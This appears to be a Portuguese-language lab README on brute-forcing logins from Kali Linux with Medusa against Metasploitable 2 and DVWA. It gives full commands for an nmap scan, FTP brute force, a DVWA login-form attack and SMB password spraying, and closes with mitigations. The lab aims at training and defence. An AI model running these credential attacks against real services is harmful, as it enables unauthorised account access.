# Brute Force com Medusa e Kali Linux 
# 📋 Descrição do Projeto 
 O projeto demonstra a implementação de uma infraestrutura virtual para realizar auditorias de segurança. Foram exploradas técnicas como Password Spraying e Credential Stuffing contra serviços de FTP, formulários Web (DVWA) e SMB. 
# 🛠️ Tecnologias e Ferramentas 
 •	Sistema Operacional: Kali Linux (Red Team) 
 •	Alvo (Target): Metasploitable 2 & DVWA 
 •	Ferramentas de Ataque: 
 o	Medusa: Ferramenta modular para força bruta em login. 
 o	Nmap: Varredura e enumeração de serviços. 
 o	Enum4linux: Enumeração de informações em sistemas Windows/Samba (SMB). 
 •	Virtualização: Oracle VirtualBox. 
# 💻 Configuração do Ambiente 
 Para evitar conflitos de IP em conexões via Tethering, foi utilizada a configuração de RedeNAT no VirtualBox para as duas máquinas virtuais: 
 1.	Kali Linux: Atuando como atacante. 
 2.	Metasploitable 2: Host vulnerável contendo serviços ativos (FTP, HTTP, SMB). 
 🚀 Etapas Práticas 
 1. Mapeamento de Rede 
 Varredura inicial para identificar portas e serviços abertos no alvo: 
 bash 
 nmap -sV -p 21,22,80,445,139 <IP_META> 
 Use o código com cuidado. 
# 2. Criação de Wordlists 
 Geração rápida de listas de usuários e senhas para os testes: 
 bash 
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt 
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt 
 Use o código com cuidado. 
# 3. Execução do Brute Force (FTP) 
 Utilizando o Medusa para identificar credenciais válidas no serviço FTP: 
 bash 
 medusa -h <IP_META> -U users.txt -P pass.txt -M ftp -t 6 
 Use o código com cuidado. 
# 4. Credential Stuffing (Web Forms) 
 Automação de login no formulário do DVWA: 
 bash 
 medusa -h <IP_META> -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6 
 Use o código com cuidado. 
# 5. Password Spraying (SMB) 
 Ataque contra o serviço SMB após enumeração de usuários com enum4linux: 
 bash 
 medusa -h <IP_META> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
 Use o código com cuidado. 
# 🛡️ Medidas de Mitigação (Prevenção) 
 Para proteger sistemas contra os ataques demonstrados, recomendam-se as seguintes práticas: 
 •	MFA (Autenticação Multifator): A barreira mais eficaz contra roubo de senhas. 
 •	Políticas de Senha Forte: Exigir senhas longas e complexas. 
 •	Bloqueio de Contas (Thresholds): Implementar CAPTCHAs ou bloqueios temporários após erros sucessivos. 
 •	Monitoramento e SIEM: Utilizar ferramentas como o Fail2Ban para banir IPs suspeitos automaticamente. 
 •	Segmentação de Rede: Restringir o acesso a portas sensíveis apenas a IPs confiáveis. 
